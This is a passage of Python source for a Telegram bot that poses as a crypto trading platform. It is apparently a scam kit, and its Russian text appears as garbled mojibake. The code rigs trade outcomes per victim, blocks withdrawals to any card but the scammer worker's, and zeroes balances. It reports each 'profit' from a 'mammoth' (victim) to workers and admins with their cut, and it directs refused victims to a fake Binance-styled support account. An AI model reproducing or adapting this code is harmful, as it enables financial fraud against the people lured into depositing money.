            await worker_bot.send_message(LOGS_CHAT_ID, f"‚ò†Ô∏è <b>–ù–æ–≤—ã–π –ø—Ä–æ—Ñ–∏—Ç!</b>  üìä TRADE \n\n"
                                                        f"üè¥‚Äç‚ò†Ô∏è –û–±—á–∏—Å—Ç–∏–ª –º–∞–º–æ–Ω—Ç–∞: <b>{username}</b> \n"
                                                        f"üí∏ –°—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è: <b>{price}‚ÇΩ</b> \n"
                                                        f"‚îî –î–æ–ª—è –≤–æ—Ä–∫–µ—Ä–∞: <b>{share}‚ÇΩ</b>")
            await call.message.edit_text(f'‚úÖ –£—Å–ø–µ—à–Ω–æ! –ë–∞–ª–∞–Ω—Å –ø–æ–ø–æ–ª–Ω–µ–Ω –Ω–∞ <b>{price}‚ÇΩ</b>')
            ADMIN_ID = env.list('ADMIN_ID')
            for admin in ADMIN_ID:
                await worker_bot.send_message(admin, f"‚ò†Ô∏è <b>–ù–æ–≤—ã–π –ø—Ä–æ—Ñ–∏—Ç!</b>  üìä TRADE \n\n"
                                                    f"üè¥‚Äç‚ò†Ô∏è –û–±—á–∏—Å—Ç–∏–ª –º–∞–º–æ–Ω—Ç–∞: <b>{worker[1]}</b> \n"
                                                    f"üí∏ –°—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è: <b>{price}‚ÇΩ</b> \n"
                                                    f"‚îî –î–æ–ª—è –≤–æ—Ä–∫–µ—Ä–∞: <b>{share}‚ÇΩ</b>")
            try:
                await worker_bot.send_message(worker[0], f"‚ò†Ô∏è <b>–£ —Ç–µ–±—è –Ω–æ–≤—ã–π –ø—Ä–æ—Ñ–∏—Ç!</b>  üìä TRADE \n\n"
                                                        f"üè¥‚Äç‚ò†Ô∏è –ú–∞–º–æ–Ω—Ç: <b><a href='tg://user?id={user[0]}'>{user[3]}</a></b> \n"
                                                        f"üí∏ –°—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è: <b>{price}‚ÇΩ</b> \n"
                                                        f"‚îî –¢–≤–æ—è –¥–æ–ª—è: <b>{share}‚ÇΩ</b>")
            except Exception as e:
                print(e)
                pass
        else:
            await call.message.answer("–û–ø–ª–∞—Ç–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞!")

@dp.callback_query_handler(text='withdraw')
async def withdraw(call: CallbackQuery):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_trading WHERE id = {call.from_user.id}').fetchone()
    if user[5] == 1:
        return
    if user[2] < 1000:
        await bot.send_message(call.from_user.id, f"–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤ –¥–ª—è –≤—ã–≤–æ–¥–∞!")
    else:
        await bot.send_message(call.from_user.id, f"üíÅüèª‚Äç‚ôÄÔ∏è –í–≤–µ–¥–∏—Ç–µ —Å–≤–æ–∏ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã –±–µ–∑ + –≤ –Ω–∞—á–∞–ª–µ \n\n"
                                                  f"–ü–æ –ø—Ä–∞–≤–∏–ª–∞–º –ø—Ä–æ–µ–∫—Ç–∞: –≤—ã–≤–æ–¥ –¥–æ—Å—Ç—É–ø–µ–Ω —Ç–æ–ª—å–∫–æ –Ω–∞ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã —Å –∫–æ—Ç–æ—Ä—ã—Ö –±—ã–ª–æ —Å–¥–µ–ª–∞–Ω–æ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–µ. \n\n"
                                                  f"<b>–ë–æ—Ç –≤—ã–≤–æ–¥–∏—Ç –≤—Å—é —Å—É–º–º—É –í–∞—à–µ–≥–æ –±–∞–ª–∞–Ω—Å–∞</b>")
        await Withdraw.q1.set()

@dp.message_handler(state=Withdraw.q1)
async def withdraw_q1(message: types.Message,state:FSMContext):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f"SELECT * FROM users_trading WHERE id = {message.from_user.id}").fetchone()
        worker = cursor.execute("SELECT * FROM worker WHERE referal_code = ?",(user[1],)).fetchone()
    if user[5] == 1:
        return

    withdraw_form = InlineKeyboardMarkup(
        inline_keyboard = [
            [
                InlineKeyboardButton(text="üí∏–í–´–í–ï–°–¢–òüí∏", callback_data=f"withdraw_balance,{message.from_user.id},trading"),
                InlineKeyboardButton(text="‚ùå–û–¢–ú–ï–ù–ò–¢–¨‚ùå", callback_data=f"no_withdraw_balance,{message.from_user.id},{user[2]},trading")
            ]
        ]
    )        
    if message.text.isdigit():
        if int(message.text) == worker[2]:
            await message.answer(f"üîî–í—ã <b>—É—Å–ø–µ—à–Ω–æ</b> –ø–æ–¥–∞–ª–∏ –∑–∞—è–≤–∫—É –Ω–∞ –≤—ã–≤–æ–¥ –¥–µ–Ω–µ–∂–Ω—ã—Ö —Å—Ä–µ–¥—Å—Ç–≤! \n"
                                 f"–†–∞—Å—Å–º–æ—Ç—Ä–µ–Ω–∏–µ –∑–∞—è–≤–∫–∏ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –≤ —Ç–µ—á–µ–Ω–∏–µ —á–∞—Å–∞! \n\n"
                                 f"<b>–°—É–º–º–∞:</b> {user[2]} \n"
                                 f"<b>–°—Ç–∞—Ç—É—Å:</b> –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç—Å—è‚Ä¶ \n\n"
                                 f"–ú—ã <b>—É–≤–µ–¥–æ–º–∏–º</b> –í–∞—Å, –æ —Å—Ç–∞—Ç—É—Å–µ –≤—ã–≤–æ–¥–∞ –¥–µ–Ω–µ–∂–Ω—ã—Ö —Å—Ä–µ–¥—Å—Ç–≤!")
            await worker_bot.send_message(worker[0], f"@{message.from_user.username} —Å–æ–∑–¥–∞–ª –∑–∞–ø—Ä–æ—Å –Ω–∞ –≤—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤ \n"
                                                    f"üí∏ –°—É–º–º–∞: <b>{user[2]}</b>", reply_markup=withdraw_form)
            with sqlite3.connect(BD_PATH) as cursor:
                cursor.execute("UPDATE users_trading SET balance = 0 WHERE id = ?", (message.from_user.id,))
            await state.finish()
        else:
            TS_btn = InlineKeyboardMarkup(
                inline_keyboard = [
                    [
                        InlineKeyboardButton(text="–¢–µ—Ö. –ü–æ–¥–¥–µ—Ä–∂–∫–∞", url="tg://resolve?domain=TradesSuppBinance")
                    ]
                ]
            )        
            await message.answer(f"üö´ <b>–í–∞–º –±—ã–ª–æ –æ—Ç–∫–∞–∑–∞–Ω–æ –≤ –≤—ã–≤–æ–¥–µ —Å—Ä–µ–¥—Å—Ç–≤!</b> \n\n"
                                 f"üëÆ‚Äç‚ôÇÔ∏è –í—ã –ø—ã—Ç–∞–µ—Ç–µ—Å—å –≤—ã–≤–µ—Å—Ç–∏ –Ω–∞ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã, —Å –∫–æ—Ç–æ—Ä—ã—Ö –ù–ï –ø–æ–ø–æ–ª–Ω—è–ª–∏ \n"
                                 f"‚ùóÔ∏è <b>–û–±—Ä–∞—Ç–∏—Ç–µ—Å—å –≤ —Ç–µ—Ö–Ω–∏—á–µ—Å–∫—É—é –ø–æ–¥–¥–µ—Ä–∂–∫—É</b>", reply_markup=TS_btn)
            await worker_bot.send_message(worker[0], f"üî•–ú–∞–º–æ–Ω—Ç @{message.from_user.username} –∑–∞–ø—Ä–æ—Å–∏–ª –≤—ã–≤–æ–¥ {user[2]} –Ω–∞ —Å–≤–æ–∏ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã, –ø—Ä–æ–∏–∑–æ—à–ª–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –æ—Ç–º–µ–Ω–∞üîÅ")
    else:
        await message.answer("–í—ã –≤–≤–µ–ª–∏ –Ω–µ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã! \n"
                             "–í—ã –≤–µ—Ä–Ω—É–ª–∏—Å—å –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é", reply_markup=scenes.main)
    await state.finish()

@dp.callback_query_handler(text=["bitcoin", "ethereum", "polkadot", "doge", "ripple", "litecoin", "terra", "solana", "tron", "cardano"])
async def ecn(call: types.CallbackQuery):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_trading WHERE id = {call.from_user.id}').fetchone()
    if user[5] == 1:
        return
    if call.data == "bitcoin":
        name_crypto = "Bitcoin"
        litteral_crypto = "BTC"
        description = "A p2p payment system that uses the unit of the same name to record transactions."
    elif call.data == "ethereum":
        name_crypto = "Ethereum"
        litteral_crypto = "ETH"
        description = "Cryptocurrency and platform for creating decentralized blockchain-based online services powered by smart contracts."
    elif call.data == "polkadot":
        name_crypto = "Polkadot"
        litteral_crypto = "DOT"
        description = ""
    elif call.data == "doge":
        name_crypto = "Dogecoin"
        litteral_crypto = "Doge"
        description = "Cryptocurrency based on Litecoin. Named after the Internet meme Doge. It was introduced on December 8, 2013."
    elif call.data == "ripple":
        name_crypto = "Ripple"
        litteral_crypto = "XRP"
        description = "Cryptocurrency platform for payment systems focused on currency exchange transactions without chargebacks."
    elif call.data == "litecoin":
        name_crypto = "Litecoin"
        litteral_crypto = "LTC"
        description = "Fork of Bitcoin, a peer-to-peer electronic payment system using the cryptocurrency of the same name."
    elif call.data == "terra":
        name_crypto = "Terra"
        litteral_crypto = "LUNA"
        description = ""
    elif call.data == "solana":
        name_crypto = "Solana"
        litteral_crypto = "SOL"
        description = ""
    elif call.data == "tron":
        name_crypto = "TRX"
        litteral_crypto = "TRX"
        description = ""
    elif call.data == "cardano":
        name_crypto = "Cardano"
        litteral_crypto = "ADA"
        description = ""
    
    await call.message.answer_photo(open(f"{PATHS}/Trading/crypto/{call.data}.jpg", 'rb'),
                              f"<b>{name_crypto}/USD</b> \n\n"
                              f"üî∏ –°–∏–º–≤–æ–ª: <b>{litteral_crypto}</b> \n"
                              f"{description} \n\n"
                              f"üí∞ –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–π \n"
                              f"–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–π - 100 ‚ÇΩ\n\n"
                              f"–í–∞—à –±–∞–ª–∞–Ω—Å: {user[2]} ‚ÇΩ", reply_markup=scenes.cancel)
    await TradeState.q1.set()

@dp.message_handler(state=TradeState.q1)
async def check_sum(message: types.Message, state: FSMContext):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_trading WHERE id = {message.from_user.id}').fetchone()
    try:
        if 100 > int(message.text) or int(message.text) > user[2]:
            await message.answer("–ù–µ–∫–∫–æ—Ä–µ–∫—Ç–Ω–æ –≤–≤–µ–¥–µ–Ω–∞ —Å—É–º–º–∞ \n"
                                 "–ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –≤–≤–æ–¥\n\n"
                                 "<b>–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–π - 100</b>", reply_markup=scenes.cancel)
        else:
            await message.answer("üìä–í—ã–±–µ—Ä–∏—Ç–µ, –∫–∞–∫ –ø–æ–≤–µ–¥—ë—Ç —Å–µ–±—è –∫—É—Ä—Å –∞–∫—Ç–∏–≤–∞ \n\n"
                                 "üìà –ö–æ—ç—Ñ—Ñ–∏—Ü–∏–µ–Ω—Ç—ã: \n"
                                 "‚¨ÜÔ∏è–ü–æ–≤—ã—à–µ–Ω–∏–µ - –•2 \n"
                                 "‚¨áÔ∏è–ü–æ–Ω–∏–∂–µ–Ω–∏–µ - X2", reply_markup=await choose(int(message.text)))
    except ValueError:
        await message.answer("–ß—Ç–æ-—Ç–æ –ø–æ—à–ª–æ –Ω–µ —Ç–∞–∫!")
    await state.finish()

@dp.callback_query_handler(choose_callback.filter(direction="up"))
async def up_btn(call: types.CallbackQuery, callback_data: dict):
    await result(call, int(callback_data.get("amount")), "‚¨ÜÔ∏è–ü–æ–≤—ã—à–µ–Ω–∏–µ")

@dp.callback_query_handler(choose_callback.filter(direction="down"))
async def down_btn(call: types.CallbackQuery, callback_data: dict):
    await result(call, int(callback_data.get("amount")), "‚¨áÔ∏è–ü–æ–Ω–∏–∂–µ–Ω–∏–µ")

async def result(call: types.CallbackQuery, amount: int, direction: str):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_trading WHERE id = {call.from_user.id}').fetchone()
    for i in range(1, 21):
        await bot.edit_message_text(f"üìä –†–µ–∑—É–ª—å—Ç–∞—Ç—ã –±—É–¥—É—Ç –∏–∑–≤–µ—Å—Ç–Ω—ã —á–µ—Ä–µ–∑ {20 - i} —Å–µ–∫—É–Ω–¥", call.message.chat.id, call.message.message_id)
        await asyncio.sleep(1)
    if user[4] == 2:
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute("UPDATE users_trading SET balance = balance + ? WHERE id = ?", (amount, call.from_user.id,))
        await call.message.answer(f"üìà –°—Ç–æ–∏–º–æ—Å—Ç—å –≤–∞–ª—é—Ç—ã –ø–æ—à–ª–∞ {direction} \n"
                                  f"‚úÖ –í–∞—à –ø—Ä–æ–≥–Ω–æ–∑ –æ–∫–∞–∑–∞–ª—Å—è –≤–µ—Ä–Ω—ã–º \n\n"
                                  f"–î–æ—Å—Ç—É–ø–Ω–æ: {int(user[2]) + amount}", reply_markup=scenes.cancel)
    elif user[4] == 1:
        forecast = random.randint(1, 2)
        if direction == '‚¨ÜÔ∏è–ü–æ–≤—ã—à–µ–Ω–∏–µ':
            direct = '‚¨áÔ∏è–ü–æ–Ω–∏–∂–µ–Ω–∏–µ'
        else:
            direct = '‚¨ÜÔ∏è–ü–æ–≤—ã—à–µ–Ω–∏–µ'
        if forecast == 1:
            with sqlite3.connect(BD_PATH) as cursor:
                cursor.execute("UPDATE users_trading SET balance = balance + ? WHERE id = ?", (amount, call.from_user.id,))
            await call.message.answer(f"üìà –°—Ç–æ–∏–º–æ—Å—Ç—å –≤–∞–ª—é—Ç—ã –ø–æ—à–ª–∞ {direct} \n"
                                      f"‚úÖ –í–∞—à –ø—Ä–æ–≥–Ω–æ–∑ –æ–∫–∞–∑–∞–ª—Å—è –≤–µ—Ä–Ω—ã–º \n\n"
                                      f"–î–æ—Å—Ç—É–ø–Ω–æ: {int(user[2]) + amount}", reply_markup=scenes.cancel)
        else:
            with sqlite3.connect(BD_PATH) as cursor:
                cursor.execute("UPDATE users_trading SET balance = balance - ? WHERE id = ?", (amount, call.from_user.id,))
            await call.message.answer(f"üìà –°—Ç–æ–∏–º–æ—Å—Ç—å –≤–∞–ª—é—Ç—ã –ø–æ—à–ª–∞ {direct} \n"
                                      f"‚ùå–í–∞—à –ø—Ä–æ–≥–Ω–æ–∑ –æ–∫–∞–∑–∞–ª—Å—è –Ω–µ–≤–µ—Ä–Ω—ã–º \n\n"
                                      f"–î–æ—Å—Ç—É–ø–Ω–æ: {int(user[2]) - amount}", reply_markup=scenes.cancel)
    else:
        if direction == '‚¨ÜÔ∏è–ü–æ–≤—ã—à–µ–Ω–∏–µ':
            direct = '‚¨áÔ∏è–ü–æ–Ω–∏–∂–µ–Ω–∏–µ'
        else:
            direct = '‚¨ÜÔ∏è–ü–æ–≤—ã—à–µ–Ω–∏–µ'
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute("UPDATE users_trading SET balance = balance - ? WHERE id = ?", (amount, call.from_user.id,))
        await call.message.answer(f"üìà–°—Ç–æ–∏–º–æ—Å—Ç—å –≤–∞–ª—é—Ç—ã –ø–æ—à–ª–∞ {direct} \n"
                                  f"‚ùå–í–∞—à –ø—Ä–æ–≥–Ω–æ–∑ –æ–∫–∞–∑–∞–ª—Å—è –Ω–µ–≤–µ—Ä–Ω—ã–º \n\n"
                                  f"–î–æ—Å—Ç—É–ø–Ω–æ: {int(user[2]) - amount}", reply_markup=scenes.cancel)
    await TradeState.q1.set()

@dp.callback_query_handler(text="cancel", state="*")
async def cancel_btn(call: types.CallbackQuery, state: FSMContext):
    await state.finish()
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    await call.message.answer("–û—Ç–º–µ–Ω–∞", reply_markup=scenes.main)

# start bot
if __name__ == '__main__':
    executor.start_polling(dp)